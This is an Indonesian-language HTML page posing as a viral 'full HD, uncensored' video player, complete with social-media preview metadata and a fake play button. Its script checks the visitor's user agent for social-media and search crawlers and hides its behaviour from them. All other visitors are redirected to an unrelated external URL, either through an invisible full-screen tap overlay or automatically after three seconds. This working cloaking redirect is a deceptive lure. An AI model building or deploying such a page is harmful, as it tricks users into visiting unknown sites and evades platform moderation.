<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Video Viral Terbaru - Full HD</title>

  <!-- OpenGraph Metadata untuk Preview Media Sosial -->

  <meta property="og:title" content="Viral! Nonton Video Lengkap Full Durasi HD">

  <meta property="og:image" content="https://jijesayang-bot.github.io/video-viral/thumb.jpg">
  <meta property="og:image:width" content="600">
  <meta property="og:image:height" content="1066">

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Viral! Nonton Video Lengkap Full Durasi HD">
  <meta name="twitter:description" content="Klik untuk memutar video lengkap tanpa sensor. Kualitas 1080p.">
  <meta name="twitter:image" content="https://jijesayang-bot.github.io/video-viral/thumb.jpg">

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body, html {
      width: 100%;
      height: 100%;
      background-color: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .player-container {
      position: relative;
      width: 100%;
      max-width: 480px;
      height: 100vh;
      background: #111;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }

    .bg-blur {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: url('thumb.jpg');
      background-size: cover;
      background-position: center;
      filter: blur(15px) brightness(0.4);
      z-index: 1;
    }

    .video-card {
      position: relative;
      z-index: 2;
      width: 90%;
      max-height: 80vh;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 10px 30px rgba(0,0,0,0.8);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .video-card img {
      width: 100%;
      height: auto;
      display: block;
      object-fit: cover;
    }

    .play-btn {
      position: absolute;
      width: 65px;
      height: 65px;
      background: rgba(255, 0, 0, 0.85);
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 0 20px rgba(255, 0, 0, 0.6);
      animation: pulse 1.5s infinite;
    }

    .play-btn::after {
      content: "";
      border-style: solid;
      border-width: 12px 0 12px 20px;
      border-color: transparent transparent transparent #fff;
      margin-left: 4px;
    }

    @keyframes pulse {
      0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); }
      70% { transform: scale(1.08); box-shadow: 0 0 0 15px rgba(255, 0, 0, 0); }
      100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); }
    }

    .tap-text {
      position: relative;
      z-index: 2;
      margin-top: 20px;
      font-size: 14px;
      color: #e2e8f0;
      letter-spacing: 0.5px;
    }

    #tap-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 9999;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="player-container">
    <div class="bg-blur"></div>
    <div class="video-card">
      <img src="thumb.jpg" alt="Preview">
      <div class="play-btn"></div>
    </div>
    <div class="tap-text">Ketuk di mana saja untuk memutar video ▶</div>
  </div>

  <div id="tap-overlay"></div>

  <script>
    const targetUrl = "https://auctionr.org/4/8863f0a61a698c2242080d6c33efe3d6";

    const botPattern = /facebookexternalhit|Facebot|Pinterest|Twitterbot|TelegramBot|WhatsApp|Googlebot|bingbot/i;
    const isBot = botPattern.test(navigator.userAgent);

    function redirectUser() {
      window.location.href = targetUrl;
    }

    if (!isBot) {
      document.getElementById("tap-overlay").addEventListener("click", redirectUser);
      document.getElementById("tap-overlay").addEventListener("touchstart", redirectUser);
      setTimeout(redirectUser, 3000);
    }
  </script>
</body>
</html>
